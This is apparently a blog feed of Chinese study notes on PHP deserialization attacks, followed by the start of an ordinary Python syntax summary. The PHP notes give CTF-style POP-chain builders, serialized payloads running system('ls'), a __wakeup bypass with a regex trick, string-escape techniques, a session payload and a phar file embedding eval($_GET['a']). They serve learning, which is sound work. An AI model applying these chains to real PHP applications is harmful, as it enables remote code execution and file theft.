    <content type="html"><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><ul><li>使用class 类名 创建一个类<ul><li>使用function 方法名（参数名） 创建方法<ul><li>在方法中使用 $this-&gt;name 来调用类里定义的变量</li></ul></li></ul></li><li>使用 $a &#x3D; new calssname 实例化一个类</li><li>使用$a-&gt;name&#x3D;a; 来指定类中变量name的值为a</li><li>使用$a-&gt;方法名(‘a’); 来指定参数的值为a</li><li>权限修饰符<ul><li>public 公有 默认为这个</li><li>private 私有 只有自己的方法能调用</li><li>protect 受保护的 自己和子类能够调用</li></ul></li></ul><h2 id="序列化基础知识"><a href="#序列化基础知识" class="headerlink" title="序列化基础知识"></a>序列化基础知识</h2><ul><li><strong>数组序列化</strong><ul><li>$a &#x3D; array(‘a’,’b’,’c’);</li><li>echo serialize($a);</li><li>a:3:{i:0;s:1:”a”;i:1:s:1:”b”;i:2:s:1:”c”}<ul><li>其中a表示数组缩写 3表示数组中有几个值 i表示数组中值的位次 s表示string 1表示长度</li></ul></li></ul></li><li><strong>对象序列化</strong></li><li>class test{</li><li>​          public $pub&#x3D;’ben’;</li><li>​          function jineng(){</li><li>​                          echo $this-&gt;pub;</li><li>​              }</li><li>}</li><li>$a &#x3D; new test();</li><li>echo serialize($a);</li><li>O:4:”test”:1:{s:3:”pub”;s:3:”ben”;}</li><li>O表示对象 4表示类名的长度 test表示类名 1表示有一个属性pub string 3是pob长度 string ben的长度 ben</li><li>需要注意的是<ul><li>私有变量的序列化字符串结果里类名旁边会有两个null字符 不可见</li><li>受保护的序列化字符串结果里属性名前面会有null*null</li></ul></li><li><strong>成员属性调用对象</strong></li><li>如果定义两个类 然后实例化类a 赋值给$a </li><li><code>&lt;?php</code><br><code>highlight_file(__FILE__);</code><br><code>class test&#123;</code><br>  <code>var $pub=&#39;benben&#39;;</code><br>  <code>function jineng()&#123;</code><br><code>echo $this-&gt;pub;</code><br>  <code>&#125;</code><br><code>&#125;</code><br><code>class test2&#123;</code><br>  <code>var $ben;</code><br>  <code>function __construct()&#123;</code><br><code>$this-&gt;ben=new test();</code><br>  <code>&#125;</code><br><code>&#125;</code><br><code>$a = new test2();</code><br><code>echo serialize($a);</code><br><code>?&gt;</code></li><li>然后序列化变量a 如果类a里面有一个construct方法是实例化另一个类</li><li>那么序列化变量a的结果就是 正常的结果中 有另一个类序列化字符串的值</li><li>O:5:”test2”:1:{s:3:”ben”;O:4:”test”:1:{s:3:”pub”;s:6:”benben”;}}</li></ul><h2 id="反序列化知识"><a href="#反序列化知识" class="headerlink" title="反序列化知识"></a>反序列化知识</h2><ul><li>需要注意的是 反序列化后 创建出来的对象 变量的值和一开始定义的没有关系 只和给的字符串中的变量的值有关系</li><li>方法不会被反序列化或序列化 所以还需要再调用之前定义好的方法</li><li>O:4:”test”:1:{s:1:”a”;s:13:”system(‘ls’);”;}</li><li>手动构造注意点<ul><li>分号别忘记 长度要注意</li></ul></li></ul><h2 id="魔术方法-构造与析构-例题"><a href="#魔术方法-构造与析构-例题" class="headerlink" title="魔术方法-构造与析构&amp;&amp;例题"></a>魔术方法-构造与析构&amp;&amp;例题</h2><ul><li>__construct方法<ul><li>在实例化对象的时候就会自动执行一次</li></ul></li><li>__destruct方法<ul><li>在对象被销毁的时候自动执行一次</li><li>所谓的被销毁一般就是脚本结束的时候</li></ul></li><li>析构函数例题<ul><li>O:4:”User”:1:{s:3:”cmd”;s:13:”system(‘ls’);”;}</li></ul></li></ul><h2 id="wakeup-sleep"><a href="#wakeup-sleep" class="headerlink" title="wakeup&amp;&amp;sleep"></a>wakeup&amp;&amp;sleep</h2><ul><li>sleep<ul><li>在序列化之前执行</li></ul></li><li>wakeup<ul><li>在反序列化之前执行</li></ul></li><li>wakeup例题<ul><li>O:4:”User”:1:{s:8:”username”;s:2:”ls”;}</li></ul></li></ul><h2 id="Tostring-invoke"><a href="#Tostring-invoke" class="headerlink" title="Tostring&amp;&amp;invoke"></a>Tostring&amp;&amp;invoke</h2><ul><li><p>__toString()</p><ul><li>echo || print 方式调用对象即可触发</li></ul></li><li><p>__invoke()</p><ul><li>把对象当成函数调用即可触发</li><li>比如$test &#x3D; new a;</li><li>$test()-&gt;benben;</li></ul></li></ul><h2 id="错误调用魔术方法"><a href="#错误调用魔术方法" class="headerlink" title="错误调用魔术方法"></a>错误调用魔术方法</h2><ul><li>__call()<ul><li>调用不存在的方法的名称和参数</li><li>public function __call($arg1,$arg2)<br>{<br>  echo “$arg1,$arg2[0]”;<br>   }<br>}<br>$test &#x3D; new User() ;<br>$test -&gt; callxxx(‘a’);</li></ul></li><li>__callStatic()<ul><li>静态调用或调用成员常量时使用的方法不存在</li><li>public function __callStatic($arg1,$arg2)<br>{<br>  echo “$arg1,$arg2[0]”;<br>   }<br>}<br>$test &#x3D; new User() ;<br>$test::callxxx(‘a’);</li></ul></li><li>__get($arg1)<ul><li>调用的属性不存在</li><li>class User {<br>public $var1;<br>public function __get($arg1)<br>{<br>  echo $arg1;<br>}<br>}<br>$test &#x3D; new User() ;<br>$test -&gt;var2;</li></ul></li><li>__set();<ul><li>class User {<br>public $var1;<br>public function __set($arg1 ,$arg2)<br>{<br>  echo $arg1.’,’.$arg2;<br>}<br>}<br>$test &#x3D; new User() ;<br>$test -&gt;var2&#x3D;1;</li><li>给不存在的成员属性赋值</li></ul></li><li>__issert<ul><li>对不可访问的属性(私有、受保护的)使用isset()、empty()时</li><li>__isset()会被调用</li><li>class User {<br>private $var;<br>public function __isset($arg1 )<br>{<br>  echo $arg1;<br>}<br>}<br>$test &#x3D; new User() ;<br>isset($test-&gt;var);</li></ul></li><li>__unset()<ul><li>对不可访问属性使用unset后输出你所传递的参数</li><li>class User {<br>private $var;<br>public function __unset($arg1 )<br>{<br>  echo $arg1;<br>}<br>}<br>$test &#x3D; new User() ;<br>unset($test-&gt;var);</li></ul></li><li>__clone<ul><li>使用clone()拷贝一个对象后</li><li>新的对象会自动调用旧对象里定义的魔法函数 __clone</li><li>class User {<br>private $var;<br>public function __clone( )<br>{<br>  echo “__clone test”;<br>   }<br>}<br>$test &#x3D; new User() ;<br>$newclass &#x3D; clone($test)</li></ul></li></ul><h2 id="POP链基础前置知识1"><a href="#POP链基础前置知识1" class="headerlink" title="POP链基础前置知识1"></a>POP链基础前置知识1</h2><ul><li><p>通过例题构造php代码来生成序列化字符串</p></li><li><p>class index {<br>private $test;<br>public function __construct(){     &#x2F;&#x2F; 5.这边有一个construct函数，说明这个脚本在new index的时候会执行这个函数 然后会让私有变量test等于new normal<br>  $this-&gt;test &#x3D; new normal();<br>}<br>public function __destruct(){<br>  $this-&gt;test-&gt;action();                &#x2F;&#x2F; 4.这里调用了action方法 看到上面是一个destruct函数 说明脚本结束的时候执行这里 也就是一定会执行这里 但是是test-&gt;action() 所以要让test为 new evil<br>}<br>}<br>class normal {<br>  public function action(){<br>echo “please attack me”;<br>  }<br>}<br>class evil {<br>  var $test2;<br>  public function action(){           &#x2F;&#x2F; 3.action()函数 说明要在上面找到这个函数被调用的点<br>eval($this-&gt;test2);                    &#x2F;&#x2F; 2.命令执行点 这里通过eval函数执行命令 命令为test2<br>  }<br>}<br>unserialize($_GET[‘test’]);              &#x2F;&#x2F; 1.传入点 这里传入一个序列化字符串以供反序列化</p></li><li><p>综上分析，传入的序列化字符串肯定是一个index类 然后要让test2的值是一个想要的命令函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span> = <span class="hljs-string">&#x27;system(&quot;ls&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$e</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>首先分析触发点 然后一步步推回去 想出要如何构造 之后构造代码即可</p></li></ul><h2 id="pop链构造前置知识2"><a href="#pop链构造前置知识2" class="headerlink" title="pop链构造前置知识2"></a>pop链构造前置知识2</h2><ul><li><p>注意</p><ul><li>魔术方法只有他所在的类或对象被调用了才能被调用</li></ul></li><li><pre><code class="hljs">`class fast &#123;`  `public $source;`  `public function __wakeup()&#123;    echo &quot;wakeup is here!!&quot;;    echo $this-&gt;source;  &#125;&#125;class sec &#123;  var $benben;  public function __tostring()&#123;`    `echo &quot;tostring is here!!&quot;;`  `&#125;``&#125;``$b = $_GET[&#39;benben&#39;];``unserialize($b);``?&gt;`<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>  <br><br>- <br><br>- ```php<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span> </span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>  &#125;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>      <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sec</span>();<br>  <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fast</span>();<br>  <span class="hljs-variable">$b</span>-&gt;source=<span class="hljs-variable">$a</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br>  <span class="hljs-meta">?&gt;</span><br>  反序列化 fast对象 wakeup先执行 <span class="hljs-keyword">echo</span> source 所以现在看fast对象的 <span class="hljs-variable">$source</span>怎么进行赋值 对于sec来说 <span class="hljs-keyword">echo</span>一个对象名 就会执行tostring<br>  所以 目光放在sec 类 <span class="hljs-keyword">new</span> sec<br></code></pre></td></tr></table></figure></code></pre></li><li><p>例题2</p></li><li></li><li><pre><code class="language-php">//flag is in flag.phpclass Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);       1.value要等于flag.php 要调用append方法 要调用invoke方法        echo $flag;    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    3.str是new test 然后调用的source在test里不存在 要触发tostring    &#125;    public function __wakeup()&#123;       4. source 是new show 调用wakeup  反序列化之前调用wakeup        echo $this-&gt;source;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();           2.要调用__get p的值要是new Modi    &#125;&#125;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- <br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-comment">//flag is in flag.php</span><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>      <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>  <br>  &#125;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>  <br>  &#125;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>      <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>      &#125;<br>  <br>  &#125;<br>  <br>  <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br>  <span class="hljs-variable">$a</span>-&gt;source=<span class="hljs-variable">$a</span>;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>  <span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$c</span>;<br>  <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br>  <span class="hljs-variable">$c</span>-&gt;p=<span class="hljs-variable">$d</span>;<br>  <br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="字符串逃逸基础-减少"><a href="#字符串逃逸基础-减少" class="headerlink" title="字符串逃逸基础-减少"></a>字符串逃逸基础-减少</h2><ul><li><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p></li><li><p>只要{}前边的数字代表的成员属性数量 和你写{}里面的数量能对上就能正常反序列化 否则会报错</p></li><li><p>如果原来的类定义里有的值 你反序列化的时候就算跳过了 他也能正常输出</p></li><li><p>“是字符还是格式符号 是由字符串长度为几来判断的</p></li><li><p>;}是不是结束符 也得看长度</p></li><li><pre><code class="language-php">&lt;?phpclass A&#123;    public $v1 = &quot;abcsystem()system()system()&quot;;    public $v2 = &#39;1234567&quot;;s:2:&quot;v3&quot;;s:1:&quot;a&quot;;&#125;&#39;;&#125;$data = serialize(new A());//echo $data;$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);var_dump(unserialize($data));?&gt;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 使用上面代码 可以构造减少的例子 原理是题目通过replace会让本来较长的字符串数量减少 所以我们可以在后面的一个字符串中 伪造出两个字符串到里面 然后前面一个字符串刚好被闭合了 只剩下第一个字符串和最后一个字符串<br><br>- v2的值是没有的 从上面定义的类里面拿下来的<br><br><span class="hljs-comment">## 字符串逃逸基础-增加</span><br><br>- 这个和上面那个正好相反 很好理解 就是增加出来的数量不被包裹 成为独立的成员属性<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span> = <span class="hljs-string">&#x27;lslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v9&quot;;s:2:&quot;aa&quot;;&#125;&#x27;</span>;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br>  &#125;<br>  <span class="hljs-variable">$data</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>());<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-string">&quot;pwd&quot;</span>,<span class="hljs-variable">$data</span>);<br>  <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure></code></pre></li></ul><h2 id="字符串增加例题-减少例题"><a href="#字符串增加例题-减少例题" class="headerlink" title="字符串增加例题&amp;&amp;减少例题"></a>字符串增加例题&amp;&amp;减少例题</h2><ul><li>增加的题目很简单</li><li>先分析代码逻辑</li><li>然后构造即可</li><li>29个php + “;s:4:”pass”;s:8:”escaping”;}</li><li>注意poc的构造 容易漏字符</li></ul><h2 id="wakeup的绕过"><a href="#wakeup的绕过" class="headerlink" title="__wakeup的绕过"></a>__wakeup的绕过</h2><ul><li><p>__wakeup函数 在反序列化之前执行</p></li><li><p>反序列化时，如果序列化字符串中的属性个数大于真实类里面定义的属性个数，那么就会跳过wakeup方法的执行</p></li><li><p>CVE-2016-7124</p></li><li><p>PHP5&lt;5.6.25</p></li><li><p>PHP7&lt;7.0.10</p></li><li><?phperror_reporting(0);class secret{  var $file='index.php';  public function __construct($file){    $this->file=$file;  }  function __destruct(){    include_once($this->file);    echo $flag;  }  function __wakeup(){    $this->file='index.php';  }}$cmd=$_GET['cmd'];if (!isset($cmd)){  highlight_file(__FILE__);}else{  if (preg_match('/[oc]:\d+:/i',$cmd)){    echo "Are you daydreaming?";  }  else{    unserialize($cmd);  }}//sercet in flag.php?></li><li><p>在这个例题中 解法是 直接修改序列化字符串里的成员属性数量即可</p></li><li><p>不过注意他的正则匹配，过滤了O:后如果加数字</p></li><li><p>所以要在O:后加上一个+ 绕过他的正则匹配</p></li><li><p>+记得url编码 以免因为歧义影响</p></li></ul><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li><p>原理相当于快捷方式 取得是地址 通过地址来获得值</p></li><li><pre><code class="language-php">$o-&gt;secret = &amp;$o-&gt;enter;</code></pre></li><li><p>这样值就是相等的</p></li></ul><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><ul><li>默认情况下用php格式储存<ul><li>键名 + 竖线| + 序列化后的值</li></ul></li><li>php_serialize的格式<ul><li>经过serialize函数序列化处理的数组</li></ul></li><li>binary<ul><li>2进制的方式去看</li><li>键名的长度对应的ascill字符 + 键名 + 序列化处理后的值</li></ul></li><li>漏洞形成原因<ul><li>读取和存储是所利用的方式不同</li><li>于是可以构造出poc进行绕过</li></ul></li><li>|O:1:”D”:1:{s:1:”a”;s:13:”system(“ls”);”;}</li><li>键名为空 | 后面被理解为序列化字符串 于是进行反序列化</li></ul><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><ul><li><p>phar是一个文件类型 也是一个php协议</p></li><li><p>使用条件比较苛刻</p><ul><li>phar文件要能上传到服务端，不过后缀是任意的</li><li>要有能用的反序列化魔术方法 wakeup destruct这种</li><li>要有文件操作函数 且参数可控</li></ul></li><li><?phphighlight_file(__FILE__);class Testobj{  var $output='';}@unlink('test.phar');  //删除之前的test.par文件(如果有)$phar=new Phar('test.phar'); //创建一个phar对象，文件名必须以phar为后缀$phar->startBuffering(); //开始写文件$phar->setStub('<?php __HALT_COMPILER(); ?><p>‘); &#x2F;&#x2F;写入stub<br>$o&#x3D;new Testobj();<br>$o-&gt;output&#x3D;’eval($_GET[“a”]);’;<br>$phar-&gt;setMetadata($o);&#x2F;&#x2F;写入meta-data<br>$phar-&gt;addFromString(“test.txt”,”test”); &#x2F;&#x2F;添加要压缩的文件<br>$phar-&gt;stopBuffering();<br>?&gt;</p></li><li><p>如果在自己本地想生成这个文件 记得修改php.ini里的参数</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python基础语法总结</title>
    <link href="/2023/12/22/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/22/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h1><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><ul><li>not ＞ and ＞ or</li></ul><h3 id="短路逻辑"><a href="#短路逻辑" class="headerlink" title="短路逻辑"></a>短路逻辑</h3><ul><li>and </li><li>如果逻辑表达式中的第一个条件为假，则整个表达式的结果必定为假，此时直接返回假。如果第一个条件为真，则继续计算后续的表达式，并返回最后一个表达式的结果。</li><li>or </li><li>如果逻辑表达式中的第一个条件为真，则整个表达式的结果必定为真。如果第一个条件为假，则继续计算后续的表达式，并返回最后一个表达式的结果。</li></ul><h3 id="分支循环"><a href="#分支循环" class="headerlink" title="分支循环"></a>分支循环</h3><ul><li>if condition1：</li></ul><p>​       statement（s）</p><ul><li><p>elif condition2：</p><p>statement（s）</p></li><li><p>elif condition3：</p></li></ul><p>​       statement（s）</p><h3 id="条件表达式（三元操作符）"><a href="#条件表达式（三元操作符）" class="headerlink" title="条件表达式（三元操作符）"></a>条件表达式（三元操作符）</h3><ul><li><p>进行举例</p></li><li><p>x，y &#x3D; 4,5  </p><p>if x &lt; y:</p><p>small &#x3D; x</p><p>else:</p><p>small &#x3D; y</p><p>可写成   small &#x3D; x if x &lt; y else y</p></li></ul><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><ul><li>while 条件：</li></ul><p>​                        循环体</p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><ul><li>for 目标 in 表达式 ：</li></ul><p>​             循环体</p><h3 id="range函数"><a href="#range函数" class="headerlink" title="range函数"></a>range函数</h3><ul><li>语法： range（[start],[stop],[step]）</li><li><code>range()</code>函数生成的范围是左闭右开。</li></ul><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><ul><li>结束本层循环</li></ul><h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><ul><li>当前位置结束本次循环，重新开始下次循环</li></ul><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ul><li>创建一个列表   member &#x3D; [1,2,3,4]</li></ul><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><ul><li><p>append() 用于向列表末尾添加一个元素</p></li><li><p>extend() 用于向列表末尾添加多个元素</p></li><li><p>insert(n,xxx) 用于向列表中第n个元素前插入一个元素</p></li><li><p>remove() 用于从列表中删除某个元素 括号内为元素</p></li><li><p>del() 用于从列表中删除某个元素 括号内为元素的位置（从0开始）</p></li><li><p>pop() 用于从列表中取出最后一个元素</p></li><li><p>切片 </p></li><li><p>从一个列表中截取一部分元素，创建一个新的列表。</p></li><li><p><code>start_index</code>：开始切片的索引（包含在切片中）。</p></li><li><p><code>end_index</code>：结束切片的索引（不包含在切片中。</p><p>例如</p></li><li><p>original_list &#x3D; [1, 2, 3, 4, 5]<br>new_list &#x3D; original_list[1:4]</p><p>&#x2F;# new_list 将会是 [2, 3, 4]  （前包后不包）</p></li><li><p>拷贝</p></li><li><p>新列表&#x3D;原列表.copy()  （浅拷贝）</p></li><li><p>也可用切片进行拷贝 （:）  new_list &#x3D; original_list[ : ]</p></li><li><p>coun() 计算列表中相同元素的个数</p></li><li><p>index() 可索引（查找）列表元素 返回值是第一个的索引值</p></li><li><p>reverse() 用于将列表中元素倒序</p></li><li><p>sort() 将列表中元素从小到大排序</p></li></ul><h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><ul><li>[expression for item in iterable if condition]<ul><li>expression表示一个表达式</li><li>item表示一个可迭代对象中的每一个元素</li><li>iterable表示一个可迭代对象</li><li>if condition是<em><strong>可选</strong></em> 的条件语句</li></ul></li></ul><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><ul><li>不可修改</li><li>元组只包含一个元素时，需要在最后一个元素后面加上逗号</li><li>可以使用 +（拼接） *（重复）等操作符</li><li>查看方式和列表相同</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>定义一个可以跨越多行的字符串方法<ul><li>‘’’  ‘’’      三引号字符串通常在不赋值的情况下当做跨行注释使用</li><li>\   \   \</li><li>(   )</li></ul></li><li>split(分隔符) 可以将字符串分割为一个列表</li></ul><h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><ul><li>id（）变量名：返回一个代表指定对象的唯一标识的整数值</li><li>is 和 not is &#x2F;&#x2F;  in 和 not in </li><li>del</li><li>list方法  <ul><li>元组转换为列表</li><li>c &#x3D; （1,2,3,4）</li><li>c &#x3D; list(c)</li></ul></li><li><strong>sorted(iterable, key&#x3D;None, reverse&#x3D;False)</strong><ul><li>对序列进行排序</li><li>iterable：要排序的序列 （列表 元组 字符串）</li><li>key ： 可选  </li><li>reverse ：可选 标识是否按照降序进行排序 True False</li></ul></li><li>sorted（）函数返回一个新的排序后的列表，而非修改原始序列。</li><li>若要就地对原始列排进行排序，可以使用列表的***sort（）***方法 但sort只能处理列表</li><li>enumerate()将每个元素插入枚举</li><li>zip（）返回由各个参数的序列组成的元组</li></ul><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="字典的创建"><a href="#字典的创建" class="headerlink" title="字典的创建"></a>字典的创建</h3><ul><li>fromkey()方法 ： 用于创建并返回一个新的字典。</li><li>dict1 &#x3D; {}</li><li>dict1.fromkeys((1,2,3))</li><li>dict2 &#x3D; {}</li><li>dict2.fromkeys((1,2,3),”Number”)</li><li>dict3 &#x3D; {}</li><li>dict3.fromkeys((1,2,3),(‘one’,’two’,’three’))</li><li>注意 键需要是 字符串 数字 元组等</li></ul><h3 id="字典的访问"><a href="#字典的访问" class="headerlink" title="字典的访问"></a>字典的访问</h3><ul><li>keys() 用于返回字典中的键<ul><li>dict1.keys()</li></ul></li><li>values() 用于返回字典中的值<ul><li>dict1.values()</li></ul></li><li>items() 用于返回 键值对</li><li>get() 方法提供更宽松的查找方式<ul><li>例如希望找不到数据时返回指定的值</li><li>dict.get（100,”没找到”）</li></ul></li></ul><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>clear（）</li><li>copy（）</li><li>pop（）<ul><li>**pop()**是给定键弹出对应的值，**popitem()**是随机弹出一个项</li></ul></li><li>setdefault()  与get相似</li><li>update()  更新字典</li></ul><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><ul><li><p>aa &#x3D; set([])</p></li><li><p>aa.remove()    aa.discard()   如果遇到集合中没有的元素 前者抛出异常 后者静默处理</p></li><li><p>aa.add()</p></li><li><p>for each in aa:</p><p>​      print(aa,end &#x3D; ‘’)</p></li><li><p>aa.update()</p></li><li><p>aa &#x3D; frozenset()   创建一个不变的集合</p></li><li><p>aa.pop()</p></li><li><p>aa.clear()</p></li><li><p>len(aa)</p></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>def 